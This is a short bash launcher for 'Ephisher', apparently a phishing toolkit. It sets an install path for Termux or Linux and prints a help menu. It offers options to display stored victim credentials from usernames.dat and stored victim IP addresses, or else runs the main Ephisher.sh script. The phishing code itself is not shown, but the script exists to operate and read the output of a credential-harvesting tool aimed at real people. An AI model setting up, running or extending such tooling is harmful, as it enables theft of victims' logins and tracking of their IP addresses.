#!/bin/bash

# https://github.com/Sabbir-787/Ephisher

if [[ $(uname -o) == *'Android'* ]];then
	EPHISHER_ROOT="/data/data/com.termux/files/usr/opt/Ephisher"
else
	export EPHISHER_ROOT="/opt/Ephisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Ephisher type \`Ephisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $EPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $EPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $EPHISHER_ROOT
	bash ./Ephisher.sh
fi
